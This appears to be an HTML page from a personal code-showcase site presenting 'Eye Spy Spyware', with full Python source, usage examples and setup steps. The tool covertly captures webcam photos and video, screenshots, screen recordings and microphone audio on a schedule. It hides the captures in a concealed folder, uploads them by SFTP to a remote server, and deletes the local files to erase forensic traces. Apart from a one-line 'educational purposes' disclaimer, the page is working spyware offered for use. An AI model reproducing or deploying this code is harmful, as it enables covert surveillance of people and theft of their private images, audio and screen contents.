@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eye Spy Spyware - Angel Code</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+        }
+
+        .header {
+            background-color: #000000;
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 3px solid #1a1a1a;
+        }
+
+        .back-button {
+            display: inline-block;
+            background-color: #dc143c;
+            color: #ffffff;
+            padding: 10px 25px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .back-button:hover {
+            background-color: #b01030;
+        }
+
+        .page-title {
+            font-size: 2.5em;
+            font-weight: 300;
+            letter-spacing: 3px;
+            margin-top: 10px;
+        }
+
+        .ascii-art {
+            background-color: #1a1a1a;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px auto;
+            max-width: 800px;
+            font-family: 'Courier New', monospace;
+            white-space: pre;
+            text-align: center;
+            border: 2px solid #dc143c;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        h3 {
+            color: #dc143c;
+            font-size: 1.5em;
+            margin-top: 50px;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+
+        .explanation {
+            background-color: #1a1a1a;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #dc143c;
+        }
+
+        .explanation p {
+            margin-bottom: 15px;
+            font-size: 1.05em;
+            line-height: 1.8;
+        }
+
+        .explanation ul {
+            margin-left: 30px;
+            margin-bottom: 15px;
+        }
+
+        .explanation li {
+            margin-bottom: 10px;
+            font-size: 1.05em;
+        }
+
+        .explanation p:last-child {
+            margin-bottom: 0;
+        }
+
+        .code-section {
+            margin-bottom: 40px;
+        }
+
+        .code-label {
+            color: #ffffff;
+            font-size: 1.1em;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        pre {
+            background-color: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 30px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.95em;
+        }
+
+        .inline-code {
+            background-color: #1a1a1a;
+            color: #ce9178;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+
+        .screenshot {
+            background-color: #1a1a1a;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            border: 1px solid #333333;
+        }
+
+        .screenshot img {
+            width: 100%;
+            border-radius: 4px;
+        }
+
+        .feature-list {
+            background-color: #1a1a1a;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            border-left: 4px solid #dc143c;
+        }
+
+        .feature-list h4 {
+            color: #dc143c;
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="../index.html" class="back-button">← Back to Home</a>
+        <div class="page-title">Eye Spy Spyware</div>
+    </div>
+
+    <div class="ascii-art">
+                 ..,,;;;;;;,,,,
+   .,;'';;,..,;;;,,,,,.''';;,..
+,,''                    '';;;;,;''    EYE SPY SPYWARE ACTIVE
+;'    ,;@@;'  ,@@;, @@, ';;;@@;,;';.
+''  ,;@@@@@'  ;@@@@; ''    ;;@@@@@;;;;
+   ;;@@@@@;    '''     .,,;;;@@@@@@@;;;
+  ;;@@@@@@;           , ';;;@@@@@@@@;;;.
+   '';@@@@@,.  ,   .   ',;;;@@@@@@;;;;;;
+      .   '';;;;;;;;;,;;;;@@@@@;;' ,.:;'
+        ''..,,     ''''    '  .,;'
+             ''''''::''''''''
+    </div>
+
+    <div class="container">
+        <h3>Overview</h3>
+
+        <div class="explanation">
+            <p>Eye Spy Spyware is a Python CLI-based spyware tool that allows you to perform various surveillance actions on a target system. All captured data is automatically sent to a remote server via SSH/SFTP and then deleted from the local machine to minimize forensic traces.</p>
+        </div>
+
+        <div class="feature-list">
+            <h4>Features</h4>
+            <ul>
+                <li>Take Webcam Photos</li>
+                <li>Record Webcam Videos</li>
+                <li>Capture Screenshots</li>
+                <li>Record Screen Activity</li>
+                <li>Record Microphone Audio</li>
+                <li>Schedule Actions at Specific Times</li>
+                <li>Automatic File Upload to Remote Server</li>
+                <li>Auto-Delete Local Files After Upload</li>
+                <li>Hidden Local Storage Folder</li>
+            </ul>
+        </div>
+
+        <h3>Configuration</h3>
+
+        <div class="explanation">
+            <p>Before running the spyware, you need to configure the SSH connection details and file paths in the script:</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">Configuration Variables</span>
+            <pre><code class="language-python">ssh_host = "your.server.com"
+ssh_port = "22"
+ssh_username = "your_username"
+ssh_password = "your_password"
+
+# Path of folder created on user's device
+local_file_path = "C:\\Users\\Public\\Documents\\.hidden"
+
+# Path of folder created on server
+remote_file_path = "/home/username/surveillance_data"</code></pre>
+        </div>
+
+        <h3>Usage Examples</h3>
+
+        <div class="explanation">
+            <p>The spyware uses command-line arguments to configure what actions to perform, when to perform them, and for how long.</p>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">Example 1: Take a Webcam Photo at 3:54 AM</span>
+            <pre><code class="language-bash">python input.py -EnableWebcamPhoto -TimeForWebcamPhoto "3:54am"</code></pre>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">Example 2: Multiple Actions at Once</span>
+            <pre><code class="language-bash">python input.py -EnableWebcamPhoto -TimeForWebcamPhoto "3:54am" \
+                -EnableScreenshot -TimeForScreenshot "3:54am" \
+                -EnableScreenRecord -TimeForScreenRecord "3:54am" -DurationForScreenRecord 5</code></pre>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">Example 3: Record Webcam Video for 30 Seconds</span>
+            <pre><code class="language-bash">python input.py -EnableWebcamVideo -TimeForWebcamVideo "2:30pm" -DurationForWebcamVideo 30</code></pre>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">Example 4: Multiple Scheduled Times</span>
+            <pre><code class="language-bash">python input.py -EnableScreenshot -TimeForScreenshot "9:00am" "12:00pm" "5:00pm"</code></pre>
+        </div>
+
+        <div class="code-section">
+            <span class="code-label">Example 5: Record Microphone for 60 Seconds</span>
+            <pre><code class="language-bash">python input.py -EnableMicrophoneRecording -TimeForMicrophoneRecording "10:00am" \
+                -DurationForMicrophoneRecording 60</code></pre>
+        </div>
+
+        <h3>Command-Line Arguments</h3>
+
+        <div class="explanation">
+            <p><strong>Enable Flags:</strong></p>
+            <ul>
+                <li><span class="inline-code">-EnableWebcamPhoto</span> - Enable webcam photo capture</li>
+                <li><span class="inline-code">-EnableScreenshot</span> - Enable screenshot capture</li>
+                <li><span class="inline-code">-EnableScreenRecord</span> - Enable screen recording</li>
+                <li><span class="inline-code">-EnableWebcamVideo</span> - Enable webcam video recording</li>
+                <li><span class="inline-code">-EnableMicrophoneRecording</span> - Enable microphone recording</li>
+            </ul>
+
+            <p><strong>Time Arguments:</strong></p>
+            <ul>
+                <li><span class="inline-code">-TimeForWebcamPhoto</span> - Schedule time(s) for webcam photos</li>
+                <li><span class="inline-code">-TimeForScreenshot</span> - Schedule time(s) for screenshots</li>
+                <li><span class="inline-code">-TimeForScreenRecord</span> - Schedule time(s) for screen recordings</li>
+                <li><span class="inline-code">-TimeForWebcamVideo</span> - Schedule time(s) for webcam videos</li>
+                <li><span class="inline-code">-TimeForMicrophoneRecording</span> - Schedule time(s) for microphone recordings</li>
+            </ul>
+
+            <p><strong>Duration Arguments (in seconds):</strong></p>
+            <ul>
+                <li><span class="inline-code">-DurationForScreenRecord</span> - Duration for screen recording</li>
+                <li><span class="inline-code">-DurationForWebcamVideo</span> - Duration for webcam video</li>
+                <li><span class="inline-code">-DurationForMicrophoneRecording</span> - Duration for microphone recording</li>
+            </ul>
+        </div>
+
+        <h3>How It Works</h3>
+
+        <div class="explanation">
+            <p><strong>1. Scheduling:</strong> The program uses the <span class="inline-code">schedule</span> library to run tasks at specified times. It runs continuously in the background, checking every second if it's time to execute a scheduled action.</p>
+            
+            <p><strong>2. Data Capture:</strong> When a scheduled time arrives, the appropriate capture function is executed:
+            <ul>
+                <li>Webcam photos/videos use OpenCV (cv2)</li>
+                <li>Screenshots use PyAutoGUI</li>
+                <li>Screen recordings combine PyAutoGUI screenshots into a video</li>
+                <li>Microphone recordings use SoundDevice</li>
+            </ul>
+            </p>
+
+            <p><strong>3. File Storage:</strong> Captured files are temporarily saved to a hidden folder on the local machine with timestamps in the filename format: <span class="inline-code">ActionName_DD-MM-YYYY_HH-MM-SS_AM/PM.extension</span></p>
+
+            <p><strong>4. Remote Transfer:</strong> Files are immediately transferred to the remote server via SFTP using the Paramiko library.</p>
+
+            <p><strong>5. Cleanup:</strong> After successful upload, the local file is automatically deleted to remove evidence.</p>
+        </div>
+
+        <h3>Dependencies</h3>
+
+        <div class="code-section">
+            <span class="code-label">Required Python Libraries</span>
+            <pre><code class="language-bash">pip install numpy opencv-python sounddevice paramiko pyautogui scipy schedule</code></pre>
+        </div>
+
+        <h3>Sample Terminal Output</h3>
+
+        <div class="screenshot">
+            <pre style="background-color: #0d1117; color: #c9d1d9; padding: 20px; border-radius: 4px; font-family: 'Courier New', monospace;">
+PS C:\Users\User> python input.py -EnableWebcamPhoto -TimeForWebcamPhoto "3:54am" -EnableScreenshot -TimeForScreenshot "3:54am" -EnableScreenRecord -TimeForScreenRecord "3:54am" -DurationForScreenRecord 5
+
+                 ..,,;;;;;;,,,,
+   .,;'';;,..,;;;,,,,,.''';;,..
+,,''                    '';;;;,;''    EYE SPY SPYWARE ACTIVE IN LOCAL MACHINE
+;'    ,;@@;'  ,@@;, @@, ';;;@@;,;';.
+''  ,;@@@@@'  ;@@@@; ''    ;;@@@@@;;;;
+   ;;@@@@@;    '''     .,,;;;@@@@@@@;;;
+  ;;@@@@@@;           , ';;;@@@@@@@@;;;.
+   '';@@@@@,.  ,   .   ',;;;@@@@@@;;;;;;
+      .   '';;;;;;;;;,;;;;@@@@@;;' ,.:;'
+        ''..,,     ''''    '  .,;'
+             ''''''::''''''''
+
+
+Scheduled webcam_photo at 03:54am
+Scheduled screenshot at 03:54am
+Scheduled screenrecord at 03:54am for 5 seconds
+            </pre>
+        </div>
+
+        <h3>Security Considerations</h3>
+
+        <div class="explanation">
+            <p><strong>Important Notes:</strong></p>
+            <ul>
+                <li>This tool is for educational and research purposes only</li>
+                <li>SSH credentials are stored in plain text - use encryption in production</li>
+            </ul>
+        </div>
+
+        <h3>Source Code</h3>
+
+        <div class="code-section">
+            <span class="code-label">Python Code</span>
+            <pre><code class="language-python">import argparse
+import sys
+import re
+import datetime
+import os
+import time
+import numpy
+import cv2
+import sounddevice
+import paramiko
+import pyautogui
+from scipy.io.wavfile import write
+import threading
+import schedule
+
+ssh_host = ""
+ssh_port = ""
+ssh_username = ""
+ssh_password = ""
+local_file_path = ""
+remote_file_path = ""  
+
+
+def parse_time(time_str):
+    try:
+        time_str = time_str.lower().replace(" ", "")
+        
+        if not re.match(r'^\d{1,2}:\d{2}(am|pm)$', time_str):
+            raise ValueError("Invalid time format. Use format like '3:30pm' or '10:45am'")
+            
+        time = datetime.datetime.strptime(time_str, "%I:%M%p")
+        return {
+            'display': time.strftime("%I:%M%p").lower(),  
+            'schedule': time.strftime("%H:%M"),
+        }
+    except ValueError as e:
+        raise argparse.ArgumentTypeError(str(e))
+
+
+def parse_duration(value):
+    try:
+        minutes = int(value)
+        if minutes &lt;= 0:
+            raise argparse.ArgumentTypeError("Duration must be greater than 0 minutes")
+        return minutes
+    except ValueError:
+        raise argparse.ArgumentTypeError(f"'{value}' Please use positive integer")
+
+
+def parser():
+    parser = argparse.ArgumentParser(description='Eye Spy Spyware Configuration')
+
+    parser.add_argument('-EnableWebcamPhoto', action='store_true', help='Enable webcam photo functionality')
+    parser.add_argument('-EnableScreenshot', action='store_true', help='Enable screenshot functionality')
+    parser.add_argument('-EnableScreenRecord', action='store_true', help='Enable screen recording functionality')
+    parser.add_argument('-EnableWebcamVideo', action='store_true', help='Enable webcam video functionality')
+    parser.add_argument('-EnableMicrophoneRecording', action='store_true', help='Enable microphone recording functionality')
+
+    parser.add_argument('-TimeForWebcamPhoto', nargs='*', type=parse_time, help='Time settings for webcam photo (ex: "3:30pm")')
+    parser.add_argument('-TimeForScreenshot', nargs='*', type=parse_time, help='Time settings for screenshot (ex: "3:30pm")')
+    parser.add_argument('-TimeForScreenRecord', nargs='*', type=parse_time, help='Time settings for screen recording (ex: "3:30pm")')
+    parser.add_argument('-TimeForWebcamVideo', nargs='*', type=parse_time, help='Time settings for webcam video (ex: "3:30pm")')
+    parser.add_argument('-TimeForMicrophoneRecording', nargs='*', type=parse_time, help='Time settings for microphone recording (ex: "3:30pm")')
+
+    parser.add_argument('-DurationForScreenRecord', type=int, help='Duration for screen recording in seconds')
+    parser.add_argument('-DurationForWebcamVideo', type=int, help='Duration for webcam video in seconds')
+    parser.add_argument('-DurationForMicrophoneRecording', type=int, help='Duration for microphone recording in seconds')
+
+    parser.add_argument('-v', '--version', action='version', version='v1.0')
+
+    args = parser.parse_args()
+
+    if(len(sys.argv[1:]) == 0):
+        sys.exit("No Arguments given, Use -h")
+
+    # Check required arguments
+    if args.EnableWebcamPhoto and not args.TimeForWebcamPhoto:
+        parser.error("Error: -TimeForWebcamPhoto is required when -EnableWebcamPhoto is enabled")
+
+    if args.EnableScreenshot and not args.TimeForScreenshot:
+        parser.error("Error: -TimeForScreenshot is required when -EnableScreenshot is enabled")
+
+    if args.EnableScreenRecord:
+        if not args.TimeForScreenRecord:
+            parser.error("Error: -TimeForScreenRecord is required when -EnableScreenRecord is enabled")
+        if not args.DurationForScreenRecord:
+            parser.error("Error: -DurationForScreenRecord is required when -EnableScreenRecord is enabled")
+
+    if args.EnableWebcamVideo:
+        if not args.TimeForWebcamVideo:
+            parser.error("Error: -TimeForWebcamVideo is required when -EnableWebcamVideo is enabled")
+        if not args.DurationForWebcamVideo:
+            parser.error("Error: -DurationForWebcamVideo is required when -EnableWebcamVideo is enabled")
+
+    if args.EnableMicrophoneRecording:
+        if not args.TimeForMicrophoneRecording:
+            parser.error("Error: -TimeForMicrophoneRecording is required when -EnableMicrophoneRecording is enabled")
+        if not args.DurationForMicrophoneRecording:
+            parser.error("Error: -DurationForMicrophoneRecording is required when -EnableMicrophoneRecording is enabled")
+
+    return args  
+
+
+def save_file(name, extension):
+    timestamp = time.strftime("%d-%m-%Y_%I-%M-%S_%p")
+    file_name = f"{name}_{timestamp}.{extension}"
+
+    try:
+        path = ""
+        os.makedirs(path, exist_ok=True)
+        hide_folder(path)
+        return os.path.join(path, file_name)
+    except Exception as e:
+        pass
+
+
+def delete_file(file):
+    if os.path.exists(file):
+        os.remove(file)
+
+
+def hide_folder(folder_path):
+    os.system(f'attrib +h "{folder_path}"')
+
+
+def send_file(host, port, username, password, local_file_path, remote_dir_path):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(hostname=host, port=int(port), username=username, password=password)
+        
+        sftp = ssh.open_sftp()
+        
+        filename = os.path.basename(local_file_path)
+        remote_dir_path = remote_dir_path.replace('/', '\\')
+        remote_file = f"{remote_dir_path}\\{filename}"
+        
+        try:
+            sftp.stat(remote_dir_path)
+        except FileNotFoundError:
+            stdin, stdout, stderr = ssh.exec_command(f'mkdir "{remote_dir_path}"')
+        
+        sftp.put(local_file_path, remote_file)
+        print("File sent to server.")
+        
+        sftp.close()
+        ssh.close()
+    except Exception as e:
+        sftp.close()
+        ssh.close()
+
+
+def microphone_record(duration):
+    try:
+        sampling_rate = 48000
+        audio = sounddevice.rec(int(sampling_rate*duration), samplerate=sampling_rate, channels=2, dtype='int16')
+        sounddevice.wait()
+        file = save_file("Microphone Recording","wav")
+        if file:
+            write(file, sampling_rate, audio)
+            send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
+            delete_file(file)
+    except Exception:
+        pass
+
+
+def screenshot():
+    file = save_file("Screenshot","png")
+    screenshot = pyautogui.screenshot()
+    screenshot.save(file)
+    send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
+    delete_file(file)
+
+
+def webcam_photo():
+    camera = cv2.VideoCapture(0)
+    try:
+        ret, frame = camera.read()
+        if ret:
+            file = save_file("Webcam Photo", "jpg")
+            cv2.imwrite(file, frame)
+            send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
+            delete_file(file)
+    finally:
+        camera.release()
+        cv2.destroyAllWindows()
+
+
+def screenrecord(duration):
+    screen_width, screen_height = pyautogui.size()
+    fourcc = cv2.VideoWriter.fourcc(*"mp4v")
+    fps = 10
+    file = save_file("Screen Recording","mp4")
+    out = cv2.VideoWriter(file, fourcc, fps, (screen_width, screen_height))
+    
+    start_time = time.time()
+    
+    while time.time() - start_time &lt; duration:
+        screenshot = pyautogui.screenshot()
+        frame = numpy.array(screenshot)
+        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+        out.write(frame)
+
+    out.release()
+    send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
+    delete_file(file)
+
+
+def webcam_video(duration):
+    camera = cv2.VideoCapture(0)
+    try:
+        if not camera.isOpened():
+            return
+
+        width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
+        height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
+
+        file = save_file("Webcam_video", "avi")
+        fourcc = cv2.VideoWriter_fourcc(*"XVID")
+        out = cv2.VideoWriter(file, fourcc, 20.0, (width, height))
+
+        start_time = time.time()
+        while time.time() - start_time &lt; duration:
+            ret, frame = camera.read()
+            if not ret:
+                break
+            out.write(frame)
+
+        out.release()
+        send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
+        delete_file(file)
+    finally:
+        camera.release()
+        cv2.destroyAllWindows()
+
+
+def schedule_action(action_func, times, duration=None):
+    for time_dict in times:
+        time_str = time_dict['schedule']
+        if duration is not None:
+            schedule.every().day.at(time_str).do(action_func, duration)
+        else:
+            schedule.every().day.at(time_str).do(action_func)
+        if duration is not None:
+            print(f"Scheduled {action_func.__name__} at {time_dict['display']} for {duration} seconds")
+        else:
+            print(f"Scheduled {action_func.__name__} at {time_dict['display']}")
+
+def run_scheduler():
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+
+def main():
+    print("""
+                 ..,,;;;;;;,,,,
+   .,;'';;,..,;;;,,,,,.''';;,..
+,,''                    '';;;;,;''    EYE SPY SPYWARE ACTIVE IN LOCAL MACHINE
+;'    ,;@@;'  ,@@;, @@, ';;;@@;,;';.
+''  ,;@@@@@'  ;@@@@; ''    ;;@@@@@;;;;
+   ;;@@@@@;    '''     .,,;;;@@@@@@@;;;
+  ;;@@@@@@;           , ';;;@@@@@@@@;;;.
+   '';@@@@@,.  ,   .   ',;;;@@@@@@;;;;;;
+      .   '';;;;;;;;;,;;;;@@@@@;;' ,.:;'
+        ''..,,     ''''    '  .,;'
+             ''''''::''''''''
+
+    """)
+    
+    args = parser()
+    
+    if args.EnableWebcamPhoto and args.TimeForWebcamPhoto:
+        schedule_action(webcam_photo, args.TimeForWebcamPhoto)
+    
+    if args.EnableScreenshot and args.TimeForScreenshot:
+        schedule_action(screenshot, args.TimeForScreenshot)
+    
+    if args.EnableScreenRecord and args.TimeForScreenRecord:
+        schedule_action(screenrecord, args.TimeForScreenRecord, args.DurationForScreenRecord) 
+    
+    if args.EnableWebcamVideo and args.TimeForWebcamVideo:
+        schedule_action(webcam_video, args.TimeForWebcamVideo, args.DurationForWebcamVideo)  
+    
+    if args.EnableMicrophoneRecording and args.TimeForMicrophoneRecording:
+        schedule_action(microphone_record, args.TimeForMicrophoneRecording, args.DurationForMicrophoneRecording)  
+    
+    scheduler_thread = threading.Thread(target=run_scheduler)
+    scheduler_thread.daemon = True
+    scheduler_thread.start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nShutting down EYE SPY SPYWARE...")
+
+if __name__ == "__main__":
+    main()</code></pre>
+        </div>
+
+    </div>
+
+    <script>
+        hljs.highlightAll();
+    </script>
+</body>
+</html>
